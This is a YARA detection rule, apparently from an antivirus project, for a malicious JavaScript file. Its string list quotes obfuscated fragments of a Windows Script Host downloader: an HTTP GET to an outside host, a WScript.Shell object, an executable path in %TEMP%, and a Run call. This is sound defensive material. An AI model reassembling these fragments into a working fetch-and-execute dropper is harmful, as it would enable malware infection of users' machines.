rule sig_20160330_5eb1ae921e1e2aee3a1743f822c3db70 {
  meta:
    description = "datamaliciousorder - file 20160330_5eb1ae921e1e2aee3a1743f822c3db70.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "daaa57fdb4adc7a04fc8023498db10f9cae3adae2d63f4ff83eed1f93ba84e76"

  strings:
    $s1  = "_CO[_OY](\"GET\", \"http://mentalmathcompetition.com/k4isa\", false);" fullword ascii
    $s2  = "function _N(_Z, _E0){_XN = _XN * 1; return _Z - _E0;};" fullword ascii
    $s3  = "var _FR = function _LX() {return WScript[_FO](\"WScript\"+\".Shell\");}(), _DB = 11;" fullword ascii
    $s4  = "if (_CO[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _E(){return _IR + \"\";};" fullword ascii
    $s6  = "function _DP() {return _FR[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"zuagUngIu7arB.ex\" + \"e\";};" fullword ascii
    $s7  = "function _V() {return ((_FO0 == true) && (_FO0 == _XP)) ? 1 : _XN;};" fullword ascii
    $s8  = "function _NW(_G){_FR[\"Run\"](_G, _XN, _XN);};" fullword ascii
    $s9  = " while (_QW){" fullword ascii
    $s10 = "return _N(_RA, _X);" fullword ascii
    $s11 = "function _XL()" fullword ascii
    $s12 = "function _HX(){return 22;};" fullword ascii
    $s13 = "function _Q(_MX) {var _N1 = (1, 2, 3, 4, 5, _MX); return _N1;};" fullword ascii
    $s14 = "var _IT = new this[\"Date\"]();" fullword ascii
    $s15 = "function _S(){return _FO;};" fullword ascii
    $s16 = "var _X0 = false;" fullword ascii
    $s17 = "var _XP = false;" fullword ascii
    $s18 = "_XP = true; " fullword ascii
    $s19 = "_FO0 = true; " fullword ascii
    $s20 = "var _FO0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}